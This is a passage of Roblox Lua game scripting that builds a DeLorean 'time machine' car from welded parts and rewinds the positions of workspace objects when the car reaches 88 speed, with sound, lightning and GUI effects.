wowz.CFrame = Torso.CFrame * CFrame.new(0,-2.5,0)
wait()
wowz.CFrame = wow.CFrame * CFrame.fromEulerAnglesXYZ(0,6,0)
wowz.BrickColor = BrickColor.Random()
end
wowz:remove()
end
function spinmesh()
local wowz = Instance.new("Part",char)
wowz.Anchored = true
wowz.CanCollide = false
wowz.Reflectance = 0.32
wowz.Shape = "Ball"
wowz.Transparency = 0
wowz.formFactor = "Custom"
wowz.Size = Vector3.new(9,9,9)
wowz.TopSurface = "Smooth"
wowz.BottomSurface = "Smooth"
wowz.CFrame = Torso.CFrame
wowz.BrickColor = BrickColor.new("Really black")
wait(3)
wowz:remove()
end
meshInsertion = coroutine.create(spinmesh)
core = coroutine.create(shock)
Tewl.Name = Nim
Tewl.Selected:connect(lul)
end}

 
 

module[1] = {"Time Machine",function()
local modelname="DeLoreanTimeMachine"
pcall(function() workspace.Base.CFrame=CFrame.new(0,-2,0) end)
print(modelname.."_LOADED")
local plr=game:service("Players").LocalPlayer
local char=plr.Character
local T=char.Torso
local c=function(f) coroutine.resume(coroutine.create(f)) end
local pc=pcall
pc(function() workspace:findFirstChild(modelname):remove() end)
local mouse=nil
local pi=math.pi
local rd=math.rad
local sn=math.sin
local cs=math.cos
local rn=math.random
local ti=table.insert
local tr=table.remove
local inf=math.huge
local cn=CFrame.new
local vc=Vector3.new
local ca=CFrame.Angles
local delorean=Instance.new("Model", workspace) delorean.Name=modelname
local screengui=Instance.new("ScreenGui") screengui.Name=modelname
part=function(par, a, c, s, col, t, cf, ms)
local p=Instance.new("Part", par) pcall(function() p.TopSurface="Smooth" p.BottomSurface="Smooth" p.formFactor="Custom" p.Anchored=a p.CanCollide=c p.Size=s p.BrickColor=BrickColor.new(col) p.Transparency=t p.CFrame=cf or cn()  end)
local m=Instance.new("BlockMesh", p) pcall(function() m.Scale=ms or Vector3.new(1, 1, 1) end)
return p
end
cylinder=function(par, a, c, s, col, t, cf, ms)
local p=Instance.new("Part", par) pcall(function() p.TopSurface="Smooth" p.BottomSurface="Smooth" p.formFactor="Custom" p.Anchored=a p.CanCollide=c p.Size=s p.BrickColor=BrickColor.new(col) p.Transparency=t p.CFrame=cf or cn()  end)
local m=Instance.new("CylinderMesh", p) pcall(function() m.Scale=ms or Vector3.new(1, 1, 1) end)
return p
end
wedge=function(par, a, c, s, col, t, cf, ms)
local p=Instance.new("Part", par) pcall(function() p.TopSurface="Smooth" p.BottomSurface="Smooth" p.formFactor="Custom" p.Anchored=a p.CanCollide=c p.Size=s p.BrickColor=BrickColor.new(col) p.Transparency=t p.CFrame=cf or cn()  end)
local m=Instance.new("SpecialMesh", p) pcall(function() m.Scale=ms or Vector3.new(1, 1, 1) m.MeshType="Wedge" end)
return p
end
gui=function(ins, par, bc, bg, tc, fs, text, t, s, pos)
local g=Instance.new(ins, par)  g.BorderColor=BrickColor.new(bc) g.BackgroundColor=BrickColor.new(bg) g.TextColor=BrickColor.new(tc) g.FontSize=fs g.Font="ArialBold" g.Text=text g.BackgroundTransparency=t g.Size=s g.Position=pos 
return g
end
weld=function(par, p1, cf)
local w=Instance.new("Weld", par) pcall(function() w.Part0=w.Parent or par w.Part1=p1 w.C1=cf or cn() end)
return w
end
mesh=function(ins, par, s, t, id, tid, of)
pcall(function() for i, v in pairs(par:children()) do if v:isA("BlockMesh") or v:isA("CylinderMesh") or v:isA("SpecialMesh") then v:remove() end end end)
local m=Instance.new(ins, par) pcall(function() m.Scale=s or Vector3.new(1, 1, 1) m.Offset=of or Vector3.new() m.MeshId=id or "" m.TextureId=tid or "" m.MeshType=t end)
return m
end
sound=function(parent, id, pitch, volume)
local s=Instance.new("Sound", parent) pcall(function() s.SoundId=id s.Volume=volume or 1 s.Pitch=pitch or 1 end)
return s
end
 
function stick(from, to)
local stickW=weld(from, to, to.CFrame:inverse()*from.CFrame)
stickW.C0=from.CFrame:inverse()*from.CFrame
return stickW
end
bp=Instance.new("BodyPosition") bp.D=200 bp.maxForce=vc(inf,inf,inf)
base=part(delorean, false, true, vc(5, .5, 14), "Really black", 0, cn(0, 200, 0))
wait()
bp.Parent=base
bp.position=(T.CFrame+T.CFrame.lookVector*20).p
base.Name="BASE"
bc=part(delorean, false, true, vc(7, .5, 6), "Really black")
bcw=weld(bc, base, cn())
bf=part(delorean, false, true, vc(7, .5, 2), "Really black")
bfw=weld(bf, base, cn(0, 0, -7))
local bb=part(delorean, false, true, vc(7, .5, 2), "Really black")
local bbw=weld(bb, base, cn(0, 0, 7))
local bf2=part(delorean, false, true, vc(6.8, 1, 1.5), "Really black")
local bf2w=weld(bf2, bf, cn(0, .5, 0))
local bc2=part(delorean, false, true, vc(5, 1, 5), "Really black")
local bc2w=weld(bc2, base, cn(0, .75, -4.5))
local bf3=part(delorean, false, true, vc(7, .5, 3), "Really black")
local bf3w=weld(bf3, bf2, cn(0, .5, -.5))
local enginesmoke=cylinder(delorean, false, true, vc(.5, 2, .5), "Dark stone grey")
local enginesmokew=weld(enginesmoke, bb, cn(2, 0, .75)*ca(-rd(90), 0, 0))
local enginesmoke=cylinder(delorean, false, true, vc(.5, 2, .5), "Dark stone grey")
local enginesmokew=weld(enginesmoke, bb, cn(-2, 0, .75)*ca(-rd(90), 0, 0))
 
local bf4=part(delorean, false, true, vc(7, .7, 3.5), "Mid gray")
local bf4w=weld(bf4, bf3, cn(0, .6, .75))
local bf5=part(delorean, false, true, vc(6, .7, 3), "Mid gray")
local bf5w=weld(bf5, bf4, cn(0, 0, 3))
 
local mprt=part(delorean, false, true, vc(7, 1, .5), "Medium stone grey", 0, cn(), vc(1, .1, 1))
local mprtw=weld(mprt, bf4, cn(0, -.3, -2))
local mprt=part(delorean, false, true, vc(7, 1, .35), "Medium stone grey", 0, cn(), vc(1, .1, 1))
local mprtw=weld(mprt, bf4, cn(0, .3, -1.9))
local mprt=part(delorean, false, true, vc(.2, .65, .5), "Medium stone grey", 0, cn(), vc(1, 1, 1))
local mprtw=weld(mprt, bf4, cn(3.4, -.03, -1.9)*ca(rd(15), 0, 0))
local mprt=part(delorean, false, true, vc(.2, .65, .5), "Medium stone grey", 0, cn(), vc(1, 1, 1))
local mprtw=weld(mprt, bf4, cn(-3.4, -.03, -1.9)*ca(rd(15), 0, 0))
local dmc=part(delorean, false, true, vc(2, .65, .5), "Really black", 0, cn(), vc(1, 1, 1))
local dmcw=weld(dmc, bf4, cn(0, -.03, -1.9)*ca(rd(15), 0, 0))
decal=Instance.new("Decal", dmc)
decal.Texture="http://www.roblox.com/asset/?id=28924870"
decal.Face="Front"
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(3.25, 1.25, -2.5)*ca(0, 0, 0))
local w=wedge(delorean, false, false, vc(.5, 1, .5), "Mid gray")
local w2=weld(w, prt, cn(0, -.5, .75)*ca(0,pi,0))
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(3.25, 1.25, -3)*ca(rd(-45), 0, 0))
 
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(-3.25, 1.25, -2.5)*ca(0, 0, 0))
local w=wedge(delorean, false, false, vc(.5, 1, .5), "Mid gray")
local w2=weld(w, prt, cn(0, -.5, .75)*ca(0,pi,0))
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(-3.25, 1.25, -3)*ca(rd(-45), 0, 0))
 
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(3.25, 1.25, 2.5)*ca(0, 0, 0))
local prt2=part(delorean, false, true, vc(.5, 2.2, 1.5), "Mid gray")
local prt2w=weld(prt2, prt, cn(-.25, 1.85, .25)*ca(0, 0, rd(10)))
local w=wedge(delorean, false, false, vc(.5, 2, 1), "Mid gray")
local w2=weld(w, prt, cn(0, 0, -1))
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(3.25, 1.25, 3)*ca(rd(45), 0, 0))
 
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(-3.25, 1.25, 2.5)*ca(0, 0, 0))
local prt2=part(delorean, false, true, vc(.5, 2.2, 1.5), "Mid gray")
local prt2w=weld(prt2, prt, cn(.25, 1.85, .25)*ca(0, 0, rd(-10)))
local w=wedge(delorean, false, false, vc(.5, 2, 1), "Mid gray")
local w2=weld(w, prt, cn(0, 0, -1))
local prt=part(delorean, false, true, vc(.5, 2, 1), "Mid gray")
local prtw=weld(prt, bc, cn(-3.25, 1.25, 3)*ca(rd(45), 0, 0))
local main=part(delorean, false, true, vc(6, .5, 1.5), "Mid gray")
local mainw=weld(main, base, cn(0, 4, 2.75))
local stand=part(delorean, false, true, vc(.5, .5, 5.5), "Mid gray")
local standw=weld(stand, base, cn(3,3,5.5)*ca(rd(22),rd(5),0))
local stand=part(delorean, false, true, vc(.5, .5, 5.5), "Mid gray")
local standw=weld(stand, base, cn(-3,3,5.5)*ca(rd(22),rd(-5),0))
local backprt=part(delorean, false, true, vc(6, 2, .5), "Black")
local backprt=weld(backprt, base, cn(0, 3, 2))
 
local window=part(delorean, false, true, vc(5, 2.5, .25), "Black", .5)
local windoww=weld(window, base, cn(0, 3, -1.25)*ca(rd(45), 0, 0))
local border=part(delorean, false, false, vc(5, .5, .5), "Really black")
local borderw=weld(border, window, cn(0, 1.5, 0))
local border=part(delorean, false, false, vc(.5, 3, .5), "Really black")
local borderw=weld(border, window, cn(2.5, 0, 0)*ca(0, 0, rd(10)))
local border=part(delorean, false, false, vc(.5, 3, .5), "Really black")
local borderw=weld(border, window, cn(-2.5, 0, 0)*ca(0, 0, rd(-10)))
local prt=weld()
local mainjoint=part(delorean, false, true, vc(2, .5, 2), "Mid gray")
local mainjointw=weld(mainjoint, base, cn(0, 4, 1))
 
local seat=part(delorean, false, false, vc(2, .5, 2), "Black")
local seatw=weld(seat, base, cn(1.5, .25, 1))
local backseat=part(delorean, false, false, vc(2, 2, .5), "Black")
local backseatw=weld(backseat, seat, cn(0, 1, 1)*ca(rd(10), 0, 0))
local headseat=part(delorean, false, false, vc(1.5, 1.25, .5), "Black")
local headseatw=weld(headseat, seat, cn(0, 2.5, 1.15))
local seat=part(delorean, false, false, vc(2, .5, 2), "Black")
local seatw=weld(seat, base, cn(-1.5, .25, 1))
local backseat=part(delorean, false, false, vc(2, 2, .5), "Black")
local backseatw=weld(backseat, seat, cn(0, 1, 1)*ca(rd(10), 0, 0))
local headseat=part(delorean, false, false, vc(1.5, 1.25, .5), "Black")
local headseatw=weld(headseat, seat, cn(0, 2.5, 1.15))
local line=part(delorean, false, false, vc(1, 1, 14), "Black")
local linew=weld(line, base, cn(0, .5, 0))
 
local back=part(delorean, false, true, vc(5, 1.5, 6), "Mid gray")
local backw=weld(back, base, cn(0, 1, 5))
local bb33s=part(delorean, false, true, vc(7, 1.5, 2), "Mid gray")
local bb33sw=weld(bb33s, base, cn(0, 1, 7))
local bbs=part(delorean, false, true, vc(7, .5, 1), "Really black")
local bbsw=weld(bbs, base, cn(0, .25, 8.25)*ca(-rd(35), 0, 0))
local bbs=part(delorean, false, true, vc(7, 1.5, .5), "Really black")
local bbsw=weld(bbs, base, cn(0, 1, 8.25))
local bb3s=part(delorean, false, true, vc(7, .5, .5), "Medium stone grey")
local bb3sw=weld(bb3s, bb33s, cn(0, 1, 1.25))
local bb3s=part(delorean, false, true, vc(7, .5, 6), "Mid gray")
local bb3sw=weld(bb3s, bb33s, cn(0, 1, -2))
decal=Instance.new("Decal", bb3s)
decal.Texture="http://www.roblox.com/asset/?id=27893351"
decal.Face="Top"
rocket=wedge(delorean, false, true, vc(2,2,4), "Black")
rocketw=weld(rocket, bb3s, cn(2,1,1.5))
r2=wedge(delorean, false, true, vc(2,1,2), "Really black")
r2w=weld(r2,rocket,cn(0,0,2.5)*ca(pi/2,pi,0))
rocket=wedge(delorean, false, true, vc(2,2,4), "Black")
rocketw=weld(rocket, bb3s, cn(-2,1,1.5))
r2=wedge(delorean, false, true, vc(2,1,2), "Really black")
r2w=weld(r2,rocket,cn(0,0,2.5)*ca(pi/2,pi,0))
pp=part(delorean, false, true, vc(2,1,5), "Black")
ppw=weld(pp,bb3s,cn(0,.5,0))
reactor=part(delorean, false, true, vc(2,1.5,2), "Dark stone grey")
reactorw=weld(reactor,pp,cn(0,-.25,1.5))
reactorm=mesh("SpecialMesh", reactor, vc(.4,.1,.4), "FileMesh", "http://www.roblox.com/Asset/?id=10207677")
cyl=cylinder(delorean,false,true,vc(.8,1.5,.8),"White")
cylw=weld(cyl,reactor,cn(0,1.5,0))
decal=Instance.new("Decal", cyl)
decal.Texture="http://www.roblox.com/asset/?id=37389443"
decal.Face="Front"
decal=Instance.new("Decal", cyl)
decal.Texture="http://www.roblox.com/asset/?id=37389443"
decal.Face="Back"
decal=Instance.new("Decal", cyl)
decal.Texture="http://www.roblox.com/asset/?id=37389443"
decal.Face="Right"
decal=Instance.new("Decal", cyl)
decal.Texture="http://www.roblox.com/asset/?id=37389319"
decal.Face="Left"
 
cyl2=cylinder(delorean,false,true,vc(.5,.5,.5),"Really black")
cyl2w=weld(cyl2,cyl,cn(0,.75,0))
but=part(delorean,false,true,vc(.4,.3,1),"Bright red")
butw=weld(but,cyl,cn(0,-.5,.5))
 
local wed=wedge(delorean, false, true, vc(7, .5, 3), "Mid gray")
local wedw=weld(wed, bf2, cn(0, 0, -.5)*ca(0, 0, pi))
local trunk=wedge(delorean, false, true, vc(7, .5, 6.35), "Mid gray")
local trunkw=weld(trunk, bf4, cn(0, .6, 1.5))
 
--TIRE
local prts=6
local rad=1.6
local tfr=cylinder(delorean, false, true, vc(2.5, 1, 2.5), "Black")
local tfrw=weld(tfr, base, cn(3,.25,-4.5)*ca(0,0,pi/2))
local met=cylinder(delorean, false, true, vc(1.5, 1.1, 1.5), "Mid gray")
local metw=weld(met, tfr, cn())
for i=0,pi,pi/prts do
local p=part(delorean, false, false, vc(1.1,1.1,.5), "Mid gray")
p.CFrame=tfr.CFrame*cn(rad*sn(i), 0, rad*cs(i))
p.CFrame=CFrame.new(p.CFrame.p, tfr.CFrame.p)
stick(p, base)
end
 
local tfl=cylinder(delorean, false, true, vc(2.5, 1, 2.5), "Black")
local tflw=weld(tfl, base, cn(-3,.25,-4.5)*ca(0,0,pi/2))
local met=cylinder(delorean, false, true, vc(1.5, 1.1, 1.5), "Mid gray")
local metw=weld(met, tfl, cn())
for i=0,pi,pi/prts do
local p=part(delorean, false, false, vc(1.1,1.1,.5), "Mid gray")
p.CFrame=tfl.CFrame*cn(rad*sn(i), 0, rad*cs(i))
p.CFrame=CFrame.new(p.CFrame.p, tfl.CFrame.p)
stick(p, base)
end
 
local tbr=cylinder(delorean, false, true, vc(2.5, 1, 2.5), "Black")
local tbrw=weld(tbr, base, cn(3,.25,4.5)*ca(0,0,pi/2))
local met=cylinder(delorean, false, true, vc(1.5, 1.1, 1.5), "Mid gray")
local metw=weld(met, tbr, cn())
for i=0,pi,pi/prts do
local p=part(delorean, false, false, vc(1.1,1.1,.5), "Mid gray")
p.CFrame=tbr.CFrame*cn(rad*sn(i), 0, rad*cs(i))
p.CFrame=CFrame.new(p.CFrame.p, tbr.CFrame.p)
stick(p, base)
end
 
local tbl=cylinder(delorean, false, true, vc(2.5, 1, 2.5), "Black")
local tblw=weld(tbl, base, cn(-3,.25,4.5)*ca(0,0,pi/2))
local met=cylinder(delorean, false, true, vc(1.5, 1.1, 1.5), "Mid gray")
local metw=weld(met, tbl, cn())
for i=0,pi,pi/prts do
local p=part(delorean, false, false, vc(1.1,1.1,.5), "Mid gray")
p.CFrame=tbl.CFrame*cn(rad*sn(i), 0, rad*cs(i))
p.CFrame=CFrame.new(p.CFrame.p, tbl.CFrame.p)
stick(p, base)
end
atfr=function(cf)
tfrw.C1=cn(3,.25,-4.5)*ca(0,0,pi/2)*cf
end
atfl=function(cf)
tflw.C1=cn(-3,.25,-4.5)*ca(0,0,pi/2)*cf
end
atbr=function(cf)
tblw.C1=cn(3,.25,4.5)*ca(0,0,pi/2)*cf
end
atbl=function(cf)
tblw.C1=cn(-3,.25,4.5)*ca(0,0,pi/2)*cf
end
local trunkw=weld(trunk, bf4, cn(0, .6, 1.25))
--SEATS
--DOOR
local DoorRight=Instance.new("Model", delorean)
local djr=part(DoorRight, false, false, vc(1, 1, 1), "Mid gray", 1)
local djrw=weld(djr, mainjoint, cn(1,0,0)*ca(0,0,0))
local dp=part(DoorRight, false, true, vc(2, .5, 2), "Mid gray")
local dpw=weld(dp, djr, cn(1, 0, 0))
local dp2=part(DoorRight, false, true, vc(.5, .5, 3.25), "Mid gray")
local dp2w=weld(dp2, dp, cn(1, -1, -2)*ca(rd(-45),rd(-10),0))
local dp3=part(DoorRight, false, true, vc(.5, 2.2, .5), "Mid gray")
local dp3w=weld(dp3, dp, cn(1, -.85, .75)*ca(0, 0, rd(15)))
local dw=wedge(DoorRight, false, true, vc(.5, 2, 1), "Mid gray")
local dww=weld(dw, dp, cn(1.25, -2.75, .5)*ca(pi,0,0))
local dw=wedge(DoorRight, false, true, vc(.5,1,.5), "Mid gray")
local dww=weld(dw, dp, cn(1.25, -3.25, -2.75)*ca(pi, pi, 0))
local dp4=part(DoorRight, false, true, vc(.5,1,.5), "Mid gray")
local dp4w=weld(dp4, dp, cn(1.25, -2.25, -2.75))
local dp5=part(DoorRight, false, true, vc(.5,2,2.5), "Mid gray")
local dp5w=weld(dp5, dp, cn(1.25, -2.75, -1.25))
local dwindow=wedge(DoorRight, false, true, vc(.25, 2, 2), "Really black", .5)
local dwindoww=weld(dwindow, dp, cn(1, -1, -1.75)*ca(0, 0, rd(15)))
local dwindow=part(DoorRight, false, true, vc(.25, 2, 1.5), "Really black", .5)
local dwindoww=weld(dwindow, dp, cn(1, -1, 0)*ca(0, 0, rd(15)))
local glass=part(DoorRight, false, true, vc(1, .5, .2), "Really black")
local glassw=weld(glass, dp, cn(1.5, -1.5, -2)*ca(0, rd(-35), 0))
 
local actr=false
local debr=false
function clickr()
if actr==false then
if debr==false then
debr=true
for i=0, 1, .1 do
djrw.C1=cn(1,0,0)*ca(0,0,rd(90)*i)
wait()
end
debr=false
actr=true
end
elseif actr==true then
if debr==false then
debr=true
for i=1, 0, -.1 do
djrw.C1=cn(1,0,0)*ca(0,0,rd(90)*i)
wait()
end
debr=false
actr=false
end
end
end
 
for i, v in pairs(DoorRight:children()) do
local cdetector=Instance.new("ClickDetector", v)
cdetector.MouseClick:connect(clickr)
end
 
local DoorLeft=Instance.new("Model", delorean)
local djl=part(DoorLeft, false, false, vc(1, 1, 1), "Mid gray", 1)
local djlw=weld(djl, mainjoint, cn(-1,0,0))
local dp=part(DoorLeft, false, true, vc(2, .5, 2), "Mid gray")
local dpw=weld(dp, djl, cn(-1, 0, 0))
local dp2=part(DoorLeft, false, true, vc(.5, .5, 3.25), "Mid gray")
local dp2w=weld(dp2, dp, cn(-1, -1, -2)*ca(rd(-45),rd(10),0))
local dp3=part(DoorLeft, false, true, vc(.5, 2.2, .5), "Mid gray")
local dp3w=weld(dp3, dp, cn(-1, -.85, .75)*ca(0, 0, rd(-15)))
local dw=wedge(DoorLeft, false, true, vc(.5, 2, 1), "Mid gray")
local dww=weld(dw, dp, cn(-1.25, -2.75, .5)*ca(pi,0,0))
local dw=wedge(DoorLeft, false, true, vc(.5,1,.5), "Mid gray")
local dww=weld(dw, dp, cn(-1.25, -3.25, -2.75)*ca(pi, pi, 0))
local dp4=part(DoorLeft, false, true, vc(.5,1,.5), "Mid gray")
local dp4w=weld(dp4, dp, cn(-1.25, -2.25, -2.75))
local dp5=part(DoorLeft, false, true, vc(.5,2,2.5), "Mid gray")
local dp5w=weld(dp5, dp, cn(-1.25, -2.75, -1.25))
local dwindow=wedge(DoorLeft, false, true, vc(.25, 2, 2), "Really black", .5)
local dwindoww=weld(dwindow, dp, cn(-1, -1, -1.75)*ca(0, 0, rd(-15)))
local dwindow=part(DoorLeft, false, true, vc(.25, 2, 1.5), "Really black", .5)
local dwindoww=weld(dwindow, dp, cn(-1, -1, 0)*ca(0, 0, rd(-15)))
local glass=part(DoorLeft, false, true, vc(1, .5, .2), "Really black")
local glassw=weld(glass, dp, cn(-1.5, -1.5, -2)*ca(0, rd(35), 0))
 
local actl=false
local debl=false
function clickl()
if actl==false then
if debl==false then
debl=true
for i=0, 1, .1 do
djlw.C1=cn(-1,0,0)*ca(0,0,rd(-90)*i)
wait()
end
debl=false
actl=true
end
elseif actl==true then
if debl==false then
debl=true
for i=1, 0, -.1 do
djlw.C1=cn(-1,0,0)*ca(0,0,rd(-90)*i)
wait()
end
debl=false
actl=false
end
end
end
 
for i, v in pairs(DoorLeft:children()) do
local cdetector=Instance.new("ClickDetector", v)
cdetector.MouseClick:connect(clickl)
end
 
local bf=Instance.new("BodyForce")
local bav=Instance.new("BodyAngularVelocity") bav.angularvelocity=vc(0,0,0) bav.maxTorque=vc(math.huge,math.huge,math.huge)
local vs=Instance.new("VehicleSeat", delorean)
vs.HeadsUpDisplay=false
vs.CanCollide=false
vs.Transparency=1
vs.Size=Vector3.new(2, .5, 2)
weld(vs, base, cn(-1.5, 0, 1))
local ps=Instance.new("VehicleSeat", delorean)
ps.HeadsUpDisplay=false
ps.CanCollide=false
ps.Size=Vector3.new(2, .5, 2)
ps.Transparency=1
weld(ps, base, cn(1.5, 0, 1))
torsos={}
ps.ChildAdded:connect(function(w)
if w.Name=="SeatWeld" then
torso=w.Part1
if torso then
        for i, v2 in pairs(torso.Parent:children()) do
                if v2:isA("BasePart") then
                        for i, v3 in pairs(v2:children()) do
                                if v3:isA("CFrameValue") then
                                        v3:remove() 
                                end
                        end
                end
        end
end
table.insert(torsos, torso)
w.C1=w.C1*CFrame.new(0, 0, .5)
end
end)
running=false
vs.ChildAdded:connect(function(w)
if w.Name=="SeatWeld" then
torso=w.Part1
w.C1=w.C1*CFrame.new(0, 0, .5)
if torso then
        for i, v2 in pairs(torso.Parent:children()) do
                if v2:isA("BasePart") then
                        for i, v3 in pairs(v2:children()) do
                                if v3:isA("CFrameValue") then
                                        v3:remove() 
                                end
                        end
                end
        end
table.insert(torsos, torso)
local player=game.Players:getPlayerFromCharacter(torso.Parent)
screengui=Instance.new("ScreenGui", player.PlayerGui) screengui.Name=modelname
speedometer=gui("TextLabel", screengui, "Black", "Black", "Really black", "Size48", "0", 1, UDim2.new(0, 100, 0, 100), UDim2.new(0, 50, .85, 0))
hourlabel=gui("TextLabel", screengui, "Black", "Black", "Really black", "Size48", "HH", 1, UDim2.new(0, 100, 0, 50), UDim2.new(.7, 0, .8, 0))
minutelabel=gui("TextLabel", hourlabel, "Black", "Black", "Really black", "Size48", "MM", 1, UDim2.new(1, 0, 1, 0), UDim2.new(1, 0, 0, 0))
secondlabel=gui("TextLabel", minutelabel, "Black", "Black", "Really black", "Size48", "SS", 1, UDim2.new(1, 0, 1, 0), UDim2.new(1, 0, 0, 0))
hourbox=gui("TextBox", hourlabel, "Black", "Black", "Really red", "Size48", "24", 1, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 1, 0))
minutebox=gui("TextBox", minutelabel, "Black", "Black", "Really red", "Size48", "00", 1, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 1, 0))
secondbox=gui("TextBox", secondlabel, "Black", "Black", "Really red", "Size48", "00", 1, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 1, 0))
running=true
run()
end
end
end)
vs.ChildRemoved:connect(function(w)
if w.Name=="SeatWeld" then
torso=w.Part1
if torso then
for i, v in pairs(torsos) do
        if v==torso then
                table.remove(torsos,i)
        end
end
local player=game.Players:getPlayerFromCharacter(torso.Parent)
player.PlayerGui[modelname]:remove()
running=false
end
end
end)
ps.ChildRemoved:connect(function(w)
if w.Name=="SeatWeld" then
torso=w.Part1
if torso then
for i, v in pairs(torsos) do
        if v==torso then
                table.remove(torsos,i)
        end
end
end
end
end)
c(function()wait(.5) bp:remove()end)
function makelightning(from, to, thick, col)
local magnitude=(from.p-to.p).magnitude
local distance=(from.p+to.p)/2
local pattern=part(workspace, true, false, vc(.2, .2, magnitude), "White", 1, cn(distance, from.p))
local fromPosProx=from.p
for i=1, 4 do
local fromPosProx2=fromPosProx
local random=vc(rn(-1, 1), rn(-1, 1), rn(-1, 1))
local findSize=pattern.Size.z/3
local findOffSet=pattern.CFrame.lookVector*-1
local compute=i*findSize*findOffSet
local newfromPos=from.p
local newEndPos=cn(random+compute+newfromPos).p
local magnitude=(fromPosProx2-newEndPos).magnitude
local distance=(fromPosProx2+newEndPos)/2
local lightning=part(workspace, true, false, vc(1, 1, 1), col or "Bright yellow", 0, cn(distance, fromPosProx2), vc(thick, thick, magnitude))
fromPosProx=newEndPos
game.Debris:addItem(lightning, .5)
end 
pattern:remove()
end
function play(soundid, pitch, volume)
local sound=sound(workspace, soundid, pitch, volume)
sound:play()
c(function() wait(5) sound:remove() end)
end
 
 
trm=Instance.new("Model", delorean)
function trail(prt, cf, thick, col)
local old=(prt.CFrame*(cf or cn())).p
local trail=part(trm, true, false, vc(1, 1, 1), col or "White", 0, cn(old)*ca(rn(-360, 360),rn(-360, 360),rn(-360, 360)), vc(thick, thick, thick))
c(function()
for i=1, 0, -.001 do pc(function() trail.Mesh.Scale=trail.Mesh.Scale*vc(i, i, i) end) wait() end
trail:remove()
end)
end
 
Targets={}
timedeb=false
num=0
maxnum=400
origin=0
function stick(from, to)
local stickW=weld(from, to, to.CFrame:inverse()*from.CFrame)
stickW.C0=from.CFrame:inverse()*from.CFrame
return stickW
end
local bp=Instance.new("BodyPosition") bp.D=100 bp.maxForce=vc(inf,inf,inf)
timedeb=false
 
function run()
num=0
c(function()
for i, v in pairs(workspace:children()) do
        if v:isA("Model") then
                for i, v2 in pairs(v:children()) do
                        if v2:isA("BasePart") then
                                for i, v3 in pairs(v2:children()) do
                                        if v3:isA("CFrameValue") then
                                                v3:remove() 
                                        end
                                end
                        end
                end
        end
end
timedeb=true
while true do
--TimeContinium-----------------------------
if num<=0 and timedeb==true then
        for i, v in pairs(workspace:children()) do
                if v:isA("BasePart") then
                        if v.Anchored==false then
                                table.insert(Targets, v)
                                local Origin = Instance.new("CFrameValue")
                                Origin.Parent = v
                                Origin.Name = "Origin CFrame"
                                Origin.Value = v.CFrame
                        end
                end
                for i, t in pairs(torsos) do
                        if v:isA("Model") and v~=t.Parent and v~=delorean then
                                for i, v2 in pairs(v:children()) do
                                        if v2:isA("BasePart") then
                                                table.insert(Targets, v2)
                                                local Origin = Instance.new("CFrameValue")
                                                Origin.Parent = v2
                                                Origin.Name = "Origin CFrame"
                                                Origin.Value = v2.CFrame
                                        end
                                end
                        end
                end
        end
---------
while num<maxnum and timedeb==true do ---print(num)
        for i, v in pairs(workspace:children()) do
                if v:isA("BasePart") and v:findFirstChild("Origin CFrame")==nil then
                        if v.Anchored==false then
                                table.insert(Targets, v)
                                local Origin = Instance.new("CFrameValue")
                                Origin.Parent = v
                                Origin.Name = "Origin CFrame"
                                Origin.Value = v.CFrame
                        end
                end
                for i, t in pairs(torsos) do
                        if v:isA("Model") and v~=t.Parent and v~=delorean then
                                for i, v2 in pairs(v:children()) do
                                        if v2:isA("BasePart") and v2:findFirstChild("Origin CFrame")==nil then
                                                table.insert(Targets, v2)
                                                local Origin = Instance.new("CFrameValue")
                                                Origin.Parent = v2
                                                Origin.Name = "Origin CFrame"
                                                Origin.Value = v2.CFrame
                                        end
                                end
                        end
                end
        end
for i, v in pairs(Targets) do
local History = Instance.new("CFrameValue") 
History.Parent = v 
History.Name = num
History.Value = v.CFrame 
end 
num = num + 1 
wait()
end
end
wait()
end
end)
while running do
local speed=base.Velocity.magnitude
speedometer.Text=math.floor(speed)
if speed>65 and speed<88 then play("http://www.roblox.com/asset/?id=2800815", 1, .5)
makelightning(base.CFrame*CFrame.new(0,0,10), base.CFrame*CFrame.new(rn(-10,10),rn(-10,10),rn(-2,10)), 1)
trail(tbr,cn(-1.5, 0, -10),2.5,"Bright orange")
trail(tbl,cn(-1.9, 0, -10),2.5,"Bright orange")
end
if speed>88 and speed<90 then play("http://roblox.com/asset/?id=10209481")
local trm2=trm:clone() trm2.Parent=workspace
origin=base.Position
print(origin)
game.Debris:addItem(trm2, 5)
bp.position=vc(0,0,-99999)
bp.Parent=base
timedeb=false
c(function()
for i=0,1,.005 do
game.Lighting.TimeOfDay=math.floor(hourbox.Text*i)..":"..math.floor(minutebox.Text*i)..":"..math.floor(secondbox.Text*i)
wait()
end
end)
while num > 0 do --print(num)
wait()
num = num - 1
for i, v in pairs(Targets) do
v.Anchored=true
local History = v:findFirstChild(num)
if History ~= nil then
v.CFrame = History.Value
History:remove()
end
end
end
for i, v in pairs(Targets) do
local Origin = v:findFirstChild("Origin CFrame")
if Origin ~= nil then
v.CFrame = Origin.Value
v:makeJoints()
Origin:remove()
end
end
for i, v in pairs(Targets) do
v.Anchored=false
end
play("http://www.roblox.com/asset/?id=2101148", 1, 1)
exp=Instance.new("Explosion", workspace)
exp.BlastPressure=0
exp.Position=origin
Targets = {}
timedeb=true
bp.position=origin
origin=0
base.Velocity=vc(0,0,0)
bf.force=base.CFrame.lookVector*0
wait(1)
bp:remove()
end
if vs.Steer==0 then bav.angularvelocity=vc(0,0,0) atfr(ca(0, 0, 0)) atfl(ca(0, 0, 0)) end
if vs.Steer==1 then atfr(ca(rd(-25), 0, 0)) atfl(ca(rd(-25), 0, 0)) end
if vs.Steer==-1 then atfr(ca(rd(25), 0, 0)) atfl(ca(rd(25), 0, 0)) end
if vs.Throttle==1 then bav.Parent=base bf.Parent=base
